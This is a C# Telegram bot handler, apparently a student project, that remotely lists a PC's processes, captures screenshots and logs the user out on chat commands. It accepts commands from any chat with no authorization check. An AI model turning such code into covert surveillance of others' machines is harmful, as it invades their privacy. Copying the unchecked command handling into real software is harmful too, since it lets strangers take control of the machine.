using System;
using Telegram.Bot;
using Telegram.Bot.Args;
using Telegram.Bot.Types.Enums;
using TelegramCw.Extensions;
using TelegramCw.Tools;

namespace TelegramCw
{
    /// <summary>
    /// Класс, обрабатывающий поступающие через Telegram команды.
    /// </summary>
    public class CommandHandler
    {
        /// <summary>
        /// Собсна, бот.
        /// </summary>
        private readonly TelegramBotClient _bot;

        public CommandHandler()
        {
            _bot = new TelegramBotClient(Infrastructure.Connection.CONNECTION_TOKEN);
            _bot.OnUpdate += OnUpdate;
            _bot.StartReceiving();

            Console.WriteLine("Start listening...");
            Console.ReadLine();
            _bot.StopReceiving();
        }

        /// <summary>
        /// Обработчик события обновления чата.
        /// </summary>
        private async void OnUpdate(object? sender, UpdateEventArgs e)
        {
            var message = e.Update.Message;

            if (message.Type == MessageType.Text)
            {
                var text = message.Text;
                var chatId = message.Chat.Id;

                switch (text)
                {
                    case Infrastructure.Commands.GET_PROCESSES:
                        await _bot.SendTextMessageAsync(chatId, "Высылаю список процессов...");
                        var processes = ProcessesWorker.GetProcesses();
                        await _bot.SendStrings(chatId, processes);
                        break;

                    case Infrastructure.Commands.UNLOG:
                        SystemWorker.Unlog();
                        await _bot.SendTextMessageAsync(chatId, "Произведен выход из системы!");
                        break;

                    case Infrastructure.Commands.GET_SCREEN:
                        await _bot.SendTextMessageAsync(chatId, "Высылаю снимок экрана...");
                        var path = ImagesWorker.GetScreenshot();
                        await _bot.SendImage(chatId, path);
                        break;

                    case Infrastructure.Commands.GET_CAM:
                        await _bot.SendTextMessageAsync(chatId, "Команда находится в разработке...");
                        break;
                    case Infrastructure.Commands.GET_USB:
                        await _bot.SendTextMessageAsync(chatId, "Команда находится в разработке...");
                        break;
                    case Infrastructure.Commands.ADD_BLOCK:
                        await _bot.SendTextMessageAsync(chatId, "Команда находится в разработке...");
                        break;
                    case Infrastructure.Commands.REMOVE_CLOCK:
                        await _bot.SendTextMessageAsync(chatId, "Команда находится в разработке...");
                        break;

                    default:
                        await _bot.SendTextMessageAsync(chatId, "Неизвестная команда. Попробуйте еще раз.");
                        break;
                }
            }
        }
    }
}